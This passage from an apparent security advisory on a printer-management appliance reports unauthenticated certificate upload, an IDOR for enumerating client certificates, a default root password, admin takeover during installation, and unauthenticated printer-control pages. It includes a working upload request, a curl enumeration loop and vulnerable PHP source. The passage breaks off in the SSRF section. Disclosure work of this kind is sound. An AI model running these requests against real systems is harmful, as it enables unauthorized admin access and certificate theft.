<span style="color: #666666">124</span>         <span style="color: #BA2121">&#39;uses&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #BA2121">&#39;CertificateController@downloadServiceHostCertificate&#39;</span>
<span style="color: #666666">125</span>     ]);]);
</pre></div>

<p>And it is possible to upload a new certificate without authentication:</p>
<pre><code>POST /admin/hp/cert_upload HTTP/1.1
Host: 10.105.0.60
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------11897246743682233937470939635
Content-Length: 1202
Origin: http://10.105.0.60
Connection: close
Referer: http://10.105.0.60/admin/design/cert_upload.php
Upgrade-Insecure-Requests: 1
Pragma: no-cache
Cache-Control: no-cache

-----------------------------11897246743682233937470939635
Content-Disposition: form-data; name="MAX_FILE_SIZE"

2621440
-----------------------------11897246743682233937470939635
Content-Disposition: form-data; name="certificate"; filename="tt"
Content-Type: application/octet-stream

-----BEGIN CERTIFICATE-----
MIICQDCCAeWgAwIBAgIMAVRI7yH9l1kN9QQKMAoGCCqGSM49BAMCMHExCzAJBgNV
BAYTAkhVMREwDwYDVQQHDAhCdWRhcGVzdDEWMBQGA1UECgwNTWljcm9zZWMgTHRk
LjEXMBUGA1UEYQwOVkFUSFUtMjM1ODQ0OTcxHjAcBgNVBAMMFWUtU3ppZ25vIFJv
b3QgQ0EgMjAxNzAeFw0xNzA4MjIxMjA3MDZaFw00MjA4MjIxMjA3MDZaMHExCzAJ
BgNVBAYTAkhVMREwDwYDVQQHDAhCdWRhcGVzdDEWMBQGA1UECgwNTWljcm9zZWMg
THRkLjEXMBUGA1UEYQwOVkFUSFUtMjM1ODQ0OTcxHjAcBgNVBAMMFWUtU3ppZ25v
IFJvb3QgQ0EgMjAxNzBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABJbcPYrYsHtv
xie+RJCxs1YVe45DJH0ahFnuY2iyxl6H0BVIHqiQrb1TotreOpCmYF9oMrWGQd+H
Wyx7xf58etqjYzBhMA8GA1UdEwEB/wQFMAMBAf8wDgYDVR0PAQH/BAQDAgEGMB0G
A1UdDgQWBBSHERUI0arBeAyxr87GyZDvvzAEwDAfBgNVHSMEGDAWgBSHERUI0arB
eAyxr87GyZDvvzAEwDAKBggqhkjOPQQDAgNJADBGAiEAtVfd14pVCzbhhkT61Nlo
jbjcI4qKDdQvfepz7L9NbKgCIQDLpbQS+ue16M9+k/zzNY9vTlp8tLxOsvxyqltZ
+efcMQ==
-----END CERTIFICATE-----


-----------------------------11897246743682233937470939635--


HTTP/1.1 200 OK
Cache-Control: no-cache, private
Content-Security-Policy: frame-ancestors 'self'
Content-Type: text/html; charset=UTF-8
Date: Wed, 03 Jan 2024 14:14:26 GMT
Server: nginx
X-Content-Type-Options: nosniff
X-Frame-Options: SAMEORIGIN
X-Xss-Protection: 1; mode=block
Connection: close
Content-Length: 37

{"message":"Success","filename":"tt"}
</code></pre>
<p>Upload a of a new certificate</p>
<p><img alt="" src="images/2025-vasion-report-2-no-auth-upload-certificate.png" /></p>
<p><a href="images/2025-vasion-report-2-no-auth-upload-certificate-full.png">Click here for full image</a></p>
<p>The APIs are implemented inside the <code>/var/www/app/Http/Controllers/HPCertificateController.php</code> file, and there is no authentication:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">21</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">HPCertificateController</span> <span style="color: #008000; font-weight: bold">extends</span> Controller
 <span style="color: #666666">22</span> {
 <span style="color: #666666">23</span>     <span style="color: #008000; font-weight: bold">use</span> DispatchesJobs;
 <span style="color: #666666">24</span>                                
 <span style="color: #666666">25</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">__construct</span>()
 <span style="color: #666666">26</span>     {
 <span style="color: #666666">27</span>     }
 <span style="color: #666666">28</span> 
 <span style="color: #666666">29</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">uploadCertificate</span>(Request <span style="color: #19177C">$request</span>)
 <span style="color: #666666">30</span>     {
 <span style="color: #666666">31</span>         <span style="color: #19177C">$file</span> <span style="color: #666666">=</span> <span style="color: #19177C">$request</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">file</span>(<span style="color: #BA2121">&#39;certificate&#39;</span>);
 <span style="color: #666666">32</span>         <span style="color: #19177C">$temp_file</span> <span style="color: #666666">=</span> \File<span style="color: #666666">::</span><span style="color: #7D9029">get</span>(<span style="color: #19177C">$file</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">path</span>());
 <span style="color: #666666">33</span>         <span style="color: #008000; font-weight: bold">if</span>((<span style="color: #008000">stripos</span>(<span style="color: #19177C">$temp_file</span>, <span style="color: #BA2121">&#39;-----BEGIN CERTIFICATE-----&#39;</span>) <span style="color: #666666">&gt;=</span> <span style="color: #666666">0</span>) <span style="color: #666666">&amp;&amp;</span> (<span style="color: #008000">stripos</span>(<span style="color: #19177C">$temp_file</span>, <span style="color: #BA2121">&#39;-----END CERTIFICATE-----&#39;</span>)))
 <span style="color: #666666">34</span>         {
 <span style="color: #666666">35</span>             <span style="color: #19177C">$api_file_service</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> ApiFilesService();
 <span style="color: #666666">36</span>             <span style="color: #19177C">$api_file</span> <span style="color: #666666">=</span> <span style="color: #19177C">$api_file_service</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getCertificateByName</span>(<span style="color: #19177C">$file</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getClientOriginalName</span>());
 <span style="color: #666666">37</span>             <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$api_file</span> <span style="color: #666666">===</span> <span style="color: #008000; font-weight: bold">null</span>)
 <span style="color: #666666">38</span>             {
 <span style="color: #666666">39</span>                 <span style="color: #19177C">$file_sql</span> <span style="color: #666666">=</span> <span style="color: #19177C">$api_file_service</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">newApiFile</span>(<span style="color: #19177C">$file</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getClientOriginalName</span>(), <span style="color: #19177C">$file</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getType</span>(), <span style="color: #008000">strlen</span>(<span style="color: #19177C">$temp_file</span>), <span style="color: #19177C">$temp_file</span>);
 <span style="color: #666666">40</span>             }
 <span style="color: #666666">41</span>             <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">42</span>             {
 <span style="color: #666666">43</span>                 <span style="color: #19177C">$file_sql</span> <span style="color: #666666">=</span> <span style="color: #19177C">$api_file_service</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">updateApiFile</span>(<span style="color: #19177C">$file</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getClientOriginalName</span>(), <span style="color: #19177C">$file</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getType</span>(), <span style="color: #008000">strlen</span>(<span style="color: #19177C">$temp_file</span>), <span style="color: #19177C">$temp_file</span>);
 <span style="color: #666666">44</span>             }
 <span style="color: #666666">45</span>             <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$file_sql</span> <span style="color: #666666">===</span> <span style="color: #008000; font-weight: bold">true</span> <span style="color: #666666">||</span> <span style="color: #19177C">$file_sql</span> <span style="color: #666666">&gt;</span> <span style="color: #666666">0</span>)
 <span style="color: #666666">46</span>             {
 <span style="color: #666666">47</span>                 <span style="color: #19177C">$needs_update</span> <span style="color: #666666">=</span> Printer<span style="color: #666666">::</span><span style="color: #7D9029">where</span>(<span style="color: #008000; font-weight: bold">function</span>(<span style="color: #19177C">$q</span>)
 <span style="color: #666666">48</span>                 {
 <span style="color: #666666">49</span>                     <span style="color: #19177C">$q</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">where</span>(<span style="color: #008000; font-weight: bold">function</span>(<span style="color: #19177C">$query</span>)
 <span style="color: #666666">50</span>                     {
 <span style="color: #666666">51</span>                         <span style="color: #19177C">$query</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">where</span>(<span style="color: #BA2121">&#39;make&#39;</span>, <span style="color: #BA2121">&#39;=&#39;</span>, <span style="color: #BA2121">&#39;hp&#39;</span>)
 <span style="color: #666666">52</span>                             <span style="color: #666666">-&gt;</span><span style="color: #7D9029">where</span>(<span style="color: #BA2121">&#39;console_installed&#39;</span>, <span style="color: #BA2121">&#39;=&#39;</span>, <span style="color: #BA2121">&#39;1&#39;</span>);
 <span style="color: #666666">53</span>                     })
 <span style="color: #666666">54</span>                     <span style="color: #666666">-&gt;</span><span style="color: #7D9029">orWhere</span>(<span style="color: #008000; font-weight: bold">function</span>(<span style="color: #19177C">$query</span>)
 <span style="color: #666666">55</span>                     {
 <span style="color: #666666">56</span>                         <span style="color: #19177C">$query</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">where</span>(<span style="color: #BA2121">&#39;make&#39;</span>, <span style="color: #BA2121">&#39;=&#39;</span>, <span style="color: #BA2121">&#39;&#39;</span>)
 <span style="color: #666666">57</span>                               <span style="color: #666666">-&gt;</span><span style="color: #7D9029">where</span>(<span style="color: #BA2121">&#39;console_installed&#39;</span>, <span style="color: #BA2121">&#39;=&#39;</span>, <span style="color: #BA2121">&#39;1&#39;</span>);
 <span style="color: #666666">58</span>                     });
 <span style="color: #666666">59</span>                 })<span style="color: #666666">-&gt;</span><span style="color: #7D9029">get</span>();
 <span style="color: #666666">60</span>                 <span style="color: #008000; font-weight: bold">foreach</span>(<span style="color: #19177C">$needs_update</span> <span style="color: #008000; font-weight: bold">as</span> <span style="color: #19177C">$update</span>)
 <span style="color: #666666">61</span>                 {   
 <span style="color: #666666">62</span>                     <span style="color: #19177C">$temp_update_result</span> <span style="color: #666666">=</span> Printer<span style="color: #666666">::</span><span style="color: #7D9029">where</span>(<span style="color: #BA2121">&#39;id&#39;</span>, <span style="color: #BA2121">&#39;=&#39;</span>, <span style="color: #19177C">$update</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span>)<span style="color: #666666">-&gt;</span><span style="color: #7D9029">first</span>();
 <span style="color: #666666">63</span>                     <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #19177C">$temp_update_result</span> <span style="color: #666666">!==</span> <span style="color: #008000; font-weight: bold">false</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #19177C">$temp_update_result</span> <span style="color: #666666">!==</span> <span style="color: #008000; font-weight: bold">null</span>)
 <span style="color: #666666">64</span>                     {
 <span style="color: #666666">65</span>                         <span style="color: #19177C">$temp_update_result</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">cpa_hp_needs_update</span> <span style="color: #666666">=</span> <span style="color: #666666">1</span>;
 <span style="color: #666666">66</span>                         <span style="color: #19177C">$temp_update_result</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">update</span>();
 <span style="color: #666666">67</span>                     }
 <span style="color: #666666">68</span>                 }
 <span style="color: #666666">69</span>                 <span style="color: #008000; font-weight: bold">try</span>
 <span style="color: #666666">70</span>                 {
 <span style="color: #666666">71</span>                     (<span style="color: #008000; font-weight: bold">new</span> UpdateHPCpaJob())
 <span style="color: #666666">72</span>                         <span style="color: #666666">-&gt;</span><span style="color: #7D9029">onQueue</span>(<span style="color: #BA2121">&#39;update-hp&#39;</span>)
 <span style="color: #666666">73</span>                         <span style="color: #666666">-&gt;</span><span style="color: #7D9029">dispatch</span>();
 <span style="color: #666666">74</span>                 }
 <span style="color: #666666">75</span>                 <span style="color: #008000; font-weight: bold">catch</span>(Exception <span style="color: #19177C">$ex</span>)
 <span style="color: #666666">76</span>                 {
 <span style="color: #666666">77</span>                     Log<span style="color: #666666">::</span><span style="color: #7D9029">debug</span>(<span style="color: #BA2121">&quot;Catch - &quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$ex</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>());
 <span style="color: #666666">78</span>                 }
 <span style="color: #666666">79</span>                 <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>
 <span style="color: #666666">80</span>                 (
 <span style="color: #666666">81</span>                     <span style="color: #BA2121">&#39;message&#39;</span>   <span style="color: #666666">=&gt;</span>  <span style="color: #BA2121">&#39;Success&#39;</span>,
 <span style="color: #666666">82</span>                     <span style="color: #BA2121">&#39;filename&#39;</span>  <span style="color: #666666">=&gt;</span>  <span style="color: #19177C">$file</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getClientOriginalName</span>(),
 <span style="color: #666666">83</span>                 );
 <span style="color: #666666">84</span>                 <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000">json_encode</span>(<span style="color: #19177C">$response</span>);
 <span style="color: #666666">85</span>             }
 <span style="color: #666666">86</span>             <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">87</span>             {
 <span style="color: #666666">88</span>                 <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>
 <span style="color: #666666">89</span>                 (
 <span style="color: #666666">90</span>                     <span style="color: #BA2121">&#39;message&#39;</span>   <span style="color: #666666">=&gt;</span>  <span style="color: #BA2121">&#39;Fail&#39;</span>,
 <span style="color: #666666">91</span>                 );
 <span style="color: #666666">92</span>                 <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000">json_encode</span>(<span style="color: #19177C">$response</span>);
 <span style="color: #666666">93</span>             }
 <span style="color: #666666">94</span>         }
 <span style="color: #666666">95</span>         <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">96</span>         {                    
 <span style="color: #666666">97</span>             <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>(
 <span style="color: #666666">98</span>                 <span style="color: #BA2121">&#39;message&#39;</span>   <span style="color: #666666">=&gt;</span>  <span style="color: #BA2121">&#39;Validation failed&#39;</span>,
 <span style="color: #666666">99</span>                 <span style="color: #BA2121">&#39;errors&#39;</span>    <span style="color: #666666">=&gt;</span>  <span style="color: #BA2121">&#39;Not a valid certificate&#39;</span>,
<span style="color: #666666">100</span>             );
<span style="color: #666666">101</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000">json_encode</span>(<span style="color: #19177C">$response</span>);
<span style="color: #666666">102</span>         }
<span style="color: #666666">103</span>     }
<span style="color: #666666">104</span>                                                                                                                                                                                                 
<span style="color: #666666">105</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">deleteCertificate</span>()                                                                                                                                                         
<span style="color: #666666">106</span>     {                                                                                                                                                                                           
<span style="color: #666666">107</span>         <span style="color: #19177C">$api_files_service</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> ApiFilesService();
<span style="color: #666666">108</span>         <span style="color: #19177C">$certificate_file</span> <span style="color: #666666">=</span> <span style="color: #19177C">$api_files_service</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getCertificate</span>();
<span style="color: #666666">109</span>         <span style="color: #19177C">$certificate_file</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">delete</span>();
<span style="color: #666666">110</span>         <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>(
<span style="color: #666666">111</span>             <span style="color: #BA2121">&quot;message&quot;</span>   <span style="color: #666666">=&gt;</span>  <span style="color: #BA2121">&quot;Success&quot;</span>,
<span style="color: #666666">112</span>         );
<span style="color: #666666">113</span>         <span style="color: #008000; font-weight: bold">return</span> <span style="color: #008000; font-weight: bold">new</span> JsonResponse(<span style="color: #19177C">$response</span>);
<span style="color: #666666">114</span>     }
<span style="color: #666666">115</span> }
</pre></div>

<p>The <code>/admin/certs/serviceclients/{scid}</code> API can be used to download SSL certificates corresponding to clients (e.g. <code>https://[redacted].printercloud10.com/admin/certs/serviceclients/1</code>). There is an IDOR vulnerability in the <code>/admin/certs/serviceclients/</code> API as it is possible to enumerate all the service clients and retrieve the corresponding SSL certificates:</p>
<pre><code>kali% for i in {1..1000}; do curl "https://[redacted].printercloud10.com/admin/certs/serviceclients/$i";echo;done
Failed to find service client with id: 1
Failed to find service client with id: 2
Failed to find service client with id: 3
Failed to find service client with id: 4
Failed to find service client with id: 5
Failed to find service client with id: 6
Failed to find service client with id: 7
Failed to find service client with id: 8
^C
kali%
</code></pre>
<p>An attacker can retrieve the certificates of clients.</p>
<p><a id="va-insecure-credentials-installation"></a></p>
<h2>Details - Insecure credentials used for the installation</h2>
<p>It was observed that default insecure credentials are used during the installation. Also, the webpage using weak credentials is reachable without authentication after the installation.</p>
<p>Using default password does not respect the California SB-327 regulation. By default, the root user has the <code>password</code> password.</p>
<p>Also, during the installation process, an attacker can reach the web interface used, specify any new credential and get admin privileges.</p>
<p>The <code>admin/query/update_database.php</code> is reachable without authentication and will use data provided by an attacker over POST to define a new admin password:</p>
<p>Content of <code>/var/www/app/admin/query/update_database.php</code>:</p>
<pre>
[...]
  2 
  3 use PrinterLogic\Events\DatabaseInitialized;
  4 use Illuminate\Support\Facades\DB;
  5 
  6 //only used during initial creation of database from management_server_Requests
  7 $err = "";
  8 
  9 set_time_limit(2400);
 10 ob_start();
 11 
 12 require_once("global.php");
 13 require_once(ABSPATH."lib/dao/dbopen.php");
 14 require_once(ABSPATH."lib/dao/my_sql/ppp_statements.php");
 15 require_once(ABSPATH."lib/dao/update_database.inc.php");
 16 
 17 echo $err;
 18 
 19 $last_error = "";
 20 $res = prepare_database($last_error, $statementcount, $statements);
 21 $le2 = ob_get_contents();
 22 ob_end_clean();
 23 
 24 if (!empty($le2)) {
 25     respond_failure($le2);
 26     die();
 27 }
 28 
 29 if ($res === 1) {
 30     respond_continue("Updating database", "");
 31     return;
 32 } elseif ($res === 2) {
 33     xml();
 34     echo '<result code="9" sub="1"><desc>'.escape_html($last_error).'</desc><params></params></result>';
 35 } elseif (!empty($last_error)) {
 36     respond_failure($last_error);
 37     die();
 38 } elseif ($res === true && isset($_POST['create_snapshot'])) {
 39     echo 'Created snapshot of database (before admin account insert and ProductionSeeders).';
 40     return;
 41 }
 42 
 43 xml_buffer();
 44 
 45 // Set the initial admin email/password.
 46 $root_user = "";
 47 $root_password = "";
 48 $root_recovery_email = "";
 49 $root_first = "";
 50 $root_last = "";
 51 
<font color=red> 52 poststr('root_user', $root_user);
 53 poststr('root_password', $root_password);
 54 poststr('root_user_email', $root_recovery_email);</font>
 55 
 56 $root_user = empty($root_user) ? "" : $root_user;
 57 $root_password = empty($root_password) ? "" : $root_password;
 58 $root_recovery_email = empty($root_recovery_email) ? "" : $root_recovery_email;
 59 $root_last = empty($root_last) ? "" : $root_last;
 60 $root_first = empty($root_first) ? "" : $root_first;
 61 
 62 if (!filter_var($root_recovery_email, FILTER_VALIDATE_EMAIL)) {
 63     respond_failure("You must enter a valid email address");
 64     die();
 65 }
 66 
 67 $result = check_admin_password_requirements($root_password);
 68 if ($result !== true) {
 69     respond_failure($result);
 70     die();
 71 }
 72 
 73 // Defined here so it isn't defined if not used
<font color=red> 74 $sha512Password = hash('sha512', "password");
 75 $sha1Password = hash('sha1', "password");</font>
 76 
 77 //for google:  username=email.   email=email.  password=oid
 78 if ($root_user != "" && $root_password != "") {
 79     require_once(ABSPATH."lib/dao/user_dao.php");
 80 
 81     $user_dao = new user_dao();
 82     $user_vo = new user_vo();
<font color=red> 83     $user_vo->id = 1;  //this isn't really solid...but I guess...</font>
 84     $user_dao->load($user_vo);
 85 
 86     // Check to make sure the root user has the initial email/password, so that this cant be used to change any users email/password
<font color=red> 87     if ($user_vo->str_email_address == "admin" &&
 88         ($user_vo->str_my_password == $sha512Password ||
 89         $user_vo->str_my_password == $sha1Password)) {</font>
 90 
 91         $user_vo->str_username = $root_user;
 92         $user_vo->str_email_address = $root_recovery_email;
 93         if (GLOBALS::$googleapp) {
 94             $user_vo->str_my_password = $root_password;
 95             $user_vo->str_first_name = $root_first;
 96             $user_vo->str_last_name = $root_last;
 97         } else {
 98             $user_vo->str_my_password = hash('sha512', $root_password);
 99         }
100 
101         $user_dao->allow_write();
102         if (!$user_dao->save($user_vo)) {
103             respond_failure("Unable to update user information");
104             die();
105         }
106
107         try {
108             GLOBALS::$login->adminVerifyLogin($root_user, $root_password);
109         } catch (Exception $e) {
110             respond_failure($e->getMessage());
111             die();
112         }
</pre>

<p>This file appears to be used during the installation of the appliance. Using default password does not respect the California SB-327 regulation.</p>
<p>During the installation process, an attacker can reach the web interface used, specify any new credential and get admin privileges.</p>
<p><a id="va-lack-of-auth-manage-printers"></a></p>
<h2>Details - No authentication required to configure/delete printers/rfid devices</h2>
<p>It was observed that the <code>console_release</code> directory contains ~ 120 PHP webpages that are reachable without authentication. These webpages allow an attacker to reconfigure printers and devices without authentication.</p>
<p>These vulnerable webpages are:</p>
<ul>
<li>/common/cpa_helper_functions.php</li>
<li>/common/global.php</li>
<li>/common/new_user_process.php</li>
<li>/common/rfid_check.php</li>
<li>/common/validate_user.php</li>
<li>/common/validate_user_class.php</li>
<li>/common/write_file.php</li>
<li>/fast_release/badge_info.php</li>
<li>/fast_release/badge_init.php</li>
<li>/fast_release/badge_register_process.php</li>
<li>/fast_release/global.php</li>
<li>/fast_release/register_badge_new.php</li>
<li>/global.php</li>
<li>/hp/AccessoriesCallbackHandler_0.php</li>
<li>/hp/auth_soap_server_0.php</li>
<li>/hp/autho_soap_server_0.php</li>
<li>/hp/badgeDelete.php</li>
<li>/hp/badgeSetup.php</li>
<li>/hp/badge_types.php</li>
<li>/hp/console.php</li>
<li>/hp/global.php</li>
<li>/hp/hp_soap_helper.php</li>
<li>/hp/index.php</li>
<li>/hp/installApp.php</li>
<li>/hp/install_popup.php</li>
<li>/hp/install_popup_load.php</li>
<li>/hp/install_popup_load2.php</li>
<li>/hp/install_popup_page_1.php</li>
<li>/hp/log_off_single_sign_on.php</li>
<li>/hp/new_user_process.php</li>
<li>/hp/popup_wide_spinner.php</li>
<li>/hp/registerNewUser.php</li>
<li>/hp/removeApp.php</li>
<li>/hp/remove_app_quick.php</li>
<li>/hp/rfid_check.php</li>
<li>/hp/setupBadgeReaderFailed1.php</li>
<li>/hp/setupBadgeReaderFailed2.php</li>
<li>/hp/setupBadgeReaderStep1.php</li>
<li>/hp/setupBadgeReaderStep2.php</li>
<li>/hp/shutdownBadgeReader.php</li>
<li>/hp/single_sign_on_login.php</li>
<li>/hp/single_sign_on_process.php</li>
<li>/hp/single_sign_on_quick_check.php</li>
<li>/hp/writeFile.php</li>
<li>/km/OpenApi.php</li>
<li>/km/badge_message.php</li>
<li>/km/badge_utils.php</li>
<li>/km/console.php</li>
<li>/km/filecache.php</li>
<li>/km/global.php</li>
<li>/km/index.php</li>
<li>/km/install_app.php</li>
<li>/km/konicaminolta_soap_helper.php</li>
<li>/km/login.php</li>
<li>/km/prep_solution.php</li>
<li>/km/remove_app.php</li>
<li>/lexmark/dellCheck.php</li>
<li>/lexmark/global.php</li>
<li>/lexmark/installApp.php</li>
<li>/lexmark/installCheck.php</li>
<li>/lexmark/installSettings.php</li>
<li>/lexmark/removeApp.php</li>
<li>/lexmark/update.php</li>
<li>/ricoh/global.php</li>
<li>/ricoh/install_app.php</li>
<li>/ricoh/processing_check.php</li>
<li>/ricoh/remove_app.php</li>
<li>/ricoh/ricoh_result.php</li>
<li>/ricoh/ricoh_state.php</li>
<li>/samsung/card_reader.php</li>
<li>/samsung/console.php</li>
<li>/samsung/download_ipar.php</li>
<li>/samsung/get_device_info.php</li>
<li>/samsung/global.php</li>
<li>/samsung/index.php</li>
<li>/samsung/install_app.php</li>
<li>/samsung/list_apps.php</li>
<li>/samsung/oauth_example.php</li>
<li>/samsung/registerNewUser.php</li>
<li>/samsung/remove_app.php</li>
<li>/samsung/samsung_rest_helper.php</li>
<li>/samsung/soap_server_0.php</li>
<li>/toshiba/change_screens.php</li>
<li>/toshiba/console.php</li>
<li>/toshiba/error_check.php</li>
<li>/toshiba/get_log.php</li>
<li>/toshiba/global.php</li>
<li>/toshiba/index.php</li>
<li>/toshiba/install_app.php</li>
<li>/toshiba/install_popup.php</li>
<li>/toshiba/login.php</li>
<li>/toshiba/login_mds.php</li>
<li>/toshiba/logout_mds.php</li>
<li>/toshiba/logout_token.php</li>
<li>/toshiba/mds_helper.php</li>
<li>/toshiba/register.php</li>
<li>/toshiba/registerNewUser.php</li>
<li>/toshiba/remove_app.php</li>
<li>/toshiba/renew_user_event.php</li>
<li>/toshiba/soap_server.php</li>
<li>/toshiba/soap_server_0.php</li>
<li>/toshiba/toshiba_logged_in.php</li>
<li>/toshiba/toshiba_soap_helper.php</li>
<li>/xerox/SendCardDataDeviceClient.php</li>
<li>/xerox/auth_login.php</li>
<li>/xerox/checkPrinter.php</li>
<li>/xerox/console.php</li>
<li>/xerox/global.php</li>
<li>/xerox/index.php</li>
<li>/xerox/index2.php</li>
<li>/xerox/index_old.php</li>
<li>/xerox/installApp.php</li>
<li>/xerox/registerNewUser.php</li>
<li>/xerox/removeApp.php</li>
<li>/xerox/rfid_check.php</li>
<li>/xerox/setupBadgeReader.php</li>
<li>/xerox/test.php</li>
<li>/xerox/xerox_auth_soap_server_0.php</li>
<li>/xerox/xerox_session.php</li>
<li>/xerox/xerox_soap_helper.php</li>
</ul>
<p>An attacker can interact with printers without authentication.</p>
<p><a id="va-ssrf-03"></a></p>
<h2>Details - 11 SSRF vulnerabilities in the console_release directory</h2>
<p>It was observed that the <code>console_release</code> directory contains PHP webpages with insecure PHP code containing SSRF vulnerabilities. The <code>console_release directory</code> is directly reachable from the network/Internet without authentication.</p>
<p>From the analysis of the source codes, it appears that the <code>$url</code> variable (used to store the IP or hostname of a printer) is verified in some files to be sure that SSRF vulnerabilities cannot be exploited when an admin defines a malicious hostname for a printer. For example, the <code>filter_var()</code> function is used to confirm that a remote printer IP is either a domain name or an IP (nullifying any printer whose hostname contains malicious data allowing SSRF vulnerabilities):</p>
<p>Presence of the <code>filter_var</code> function with <code>FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME</code>:</p>
<pre><code>kali% rgrep -n FILTER_VALIDATE_DOMAIN      
toshiba/toshiba_soap_helper.php:125:    $url = filter_var($url, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
lexmark/update.php:185:            $local_url = filter_var($this_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
lexmark/update.php:290:        $local_url = filter_var($this_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
lexmark/installSettings.php:108:        $local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
lexmark/installApp.php:40:$local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
km/konicaminolta_soap_helper.php:113:        $local_ip = filter_var($this-&gt;host_ip, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
km/konicaminolta_soap_helper.php:191:        $local_ip = filter_var($this-&gt;host_ip, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
km/konicaminolta_soap_helper.php:263:           $local_ip = filter_var($this-&gt;host_ip, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
xerox/installApp.php:68:    $local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
xerox/xerox_soap_helper.php:52:    $url = filter_var($url, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
xerox/xerox_soap_helper.php:148:    $url = filter_var($url, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
xerox/xerox_soap_helper.php:219:    $url = filter_var($url, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
xerox/xerox_soap_helper.php:317:    $url = filter_var($url, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
xerox/removeApp.php:51:        $local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
xerox/xerox_auth_soap_server_0.php:661:        $local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
samsung/list_apps.php:28:  $local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
samsung/list_apps.php:59:    $local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
samsung/remove_app.php:29:    $local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
samsung/remove_app.php:55:    $local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
samsung/remove_app.php:94:      $local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
samsung/samsung_rest_helper.php:21:  $url = filter_var($url, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
